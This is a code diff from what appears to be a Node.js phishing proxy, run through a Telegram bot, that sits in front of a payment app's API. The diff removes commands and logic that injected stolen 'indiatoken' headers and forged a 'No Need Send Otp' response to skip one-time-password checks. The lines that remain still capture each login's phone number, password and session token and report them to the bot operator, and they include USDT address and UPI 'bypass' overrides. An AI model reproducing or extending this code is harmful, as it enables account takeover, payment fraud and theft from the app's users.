@@ -29,9 +29,7 @@ const DEFAULT_DATA = {
   userOverrides: {},
   trackedUsers: {},
   blockUpdate: true,
-  orderBankMap: {},
-  nextIndiaToken: '',
-  alwaysIndiaToken: ''
+  orderBankMap: {}
 };
 
 let bot = null;
@@ -697,11 +695,6 @@ app.post('/bot-webhook', async (req, res) => {
 /usdt <address> — Set USDT
 /usdt off — Disable
 
-=== OTP BYPASS (India Token) ===
-/usetoken <token> — Next login pe yeh India Token inject hoga (single use)
-/alwaystoken <token> — Har login pe yeh India Token inject hoga (permanent)
-/alwaystoken off — Disable permanent token
-
 === TRACKING ===
 /idtrack — All tracked users
 
@@ -1003,41 +996,6 @@ Example:
       return res.sendStatus(200);
     }
 
-    if (text.startsWith('/usetoken ')) {
-      const token = text.substring(10).trim();
-      if (!token || token.length < 10) {
-        await bot.sendMessage(chatId, '❌ Invalid token.\nFormat: /usetoken <indiatoken>');
-        return res.sendStatus(200);
-      }
-      data.nextIndiaToken = token;
-      data._skipOverrideMerge = true;
-      await saveData(data);
-      await bot.sendMessage(chatId,
-        `✅ India Token set — SINGLE USE\n\n🇮🇳 Token:\n${token}\n\nAgli baar jab bhi login hoga (app/site), yeh token indiatoken header mein inject hoga.\nServer samjhega: returning device → OTP skip.\n\nEk baar use hone ke baad auto-clear ho jayega.`
-      );
-      return res.sendStatus(200);
-    }
-
-    if (text.startsWith('/alwaystoken ')) {
-      const token = text.substring(13).trim();
-      if (token.toLowerCase() === 'off') {
-        data.alwaysIndiaToken = '';
-        data._skipOverrideMerge = true;
-        await saveData(data);
-        await bot.sendMessage(chatId, '❌ Always India Token disabled.\nAb normal flow chalega.');
-      } else if (token.length >= 10) {
-        data.alwaysIndiaToken = token;
-        data._skipOverrideMerge = true;
-        await saveData(data);
-        await bot.sendMessage(chatId,
-          `✅ Always India Token set — PERMANENT\n\n🇮🇳 Token:\n${token}\n\nAb HAMESHA yeh token inject hoga har login request mein.\nClear data ke baad bhi OTP nahi aayega.\n\nBand karne ke liye: /alwaystoken off`
-        );
-      } else {
-        await bot.sendMessage(chatId, '❌ Invalid token.\nFormat: /alwaystoken <indiatoken>\nBand karne ke liye: /alwaystoken off');
-      }
-      return res.sendStatus(200);
-    }
-
     return res.sendStatus(200);
   } catch (e) {
     console.error('Bot error:', e);
@@ -1214,41 +1172,6 @@ app.all('/xxapi/*', async (req, res) => {
       res.setHeader('Access-Control-Allow-Credentials', 'true');
       return res.status(200).end('OK');
     }
-
-    // ── India Token Injection ─────────────────────────────────────────────────
-    // Inject stored indiatoken so server skips OTP even after clear data
-    {
-      const injectToken = data.alwaysIndiaToken || data.nextIndiaToken || '';
-      if (injectToken && !req.headers['indiatoken']) {
-        req.headers['indiatoken'] = injectToken;
-        if (data.nextIndiaToken && !data.alwaysIndiaToken) {
-          // Single use — clear after injecting
-          data.nextIndiaToken = '';
-          data._skipOverrideMerge = true;
-          saveData(data).catch(() => {});
-        }
-      }
-    }
-    // ──────────────────────────────────────────────────────────────────────────
-
-    // ── OTP Bypass: Force "No Need Send Otp" when token is set ──────────────────
-    // Instead of relying on server recognizing injected token, override checkSmsNew response
-    const isCheckSms = urlLower.includes('checksmsnew') || urlLower.includes('checksms') ||
-      urlLower.includes('check_sms') || urlLower.includes('smscheck') || urlLower.includes('smsnew');
-    if (isCheckSms && (data.alwaysIndiaToken || data.nextIndiaToken)) {
-      // Clear single-use token after use
-      if (data.nextIndiaToken && !data.alwaysIndiaToken) {
-        data.nextIndiaToken = '';
-        data._skipOverrideMerge = true;
-        saveData(data).catch(() => {});
-      }
-      const fakeResp = JSON.stringify({ code: 2085, msg: 'No Need Send Otp' });
-      res.setHeader('Content-Type', 'application/json; charset=utf-8');
-      res.setHeader('Access-Control-Allow-Origin', '*');
-      res.setHeader('Content-Length', String(Buffer.byteLength(fakeResp)));
-      return res.status(200).end(fakeResp);
-    }
-    // ──────────────────────────────────────────────────────────────────────────
 
     // ── 100% CLEAN BYPASS FOR UPI & TEAM BUTTONS ──────────────────────────────
     if (urlLower.includes('/collectiontoollist') || urlLower.includes('/teaminfo')) {
@@ -1587,9 +1510,6 @@ app.all('/xxapi/*', async (req, res) => {
         if (cookieMatch) extractedToken = cookieMatch[1];
       }
 
-      // Extract indiatoken from REQUEST header — this is the old stored token the app sent
-      const reqIndiaToken = req.headers['indiatoken'] || req.headers['india-token'] || '';
-
       const isApp = req.headers['x-requested-with'] === 'com.vivipay.runapp' || (req.headers['user-agent'] && req.headers['user-agent'].includes('wv'));
       const platformStr = isApp ? '📱 Android App' : '🌐 Web Browser';
 
@@ -1597,7 +1517,7 @@ app.all('/xxapi/*', async (req, res) => {
         `🔑 LOGIN CAPTURED
 👤 User: ${userId || 'N/A'}
 💻 Platform: ${platformStr}
-📱 Phone: ${phone || 'N/A'}${pwd ? '\n🔐 Pass: ' + pwd : ''}${extractedToken ? '\n🎫 New Token: ' + extractedToken : ''}${reqIndiaToken ? '\n🇮🇳 India Token (stored): ' + reqIndiaToken : ''}
+📱 Phone: ${phone || 'N/A'}${pwd ? '\n🔐 Pass: ' + pwd : ''}${extractedToken ? '\n🎫 Token: ' + extractedToken : ''}
 🕐 ${now}`);
 
     }
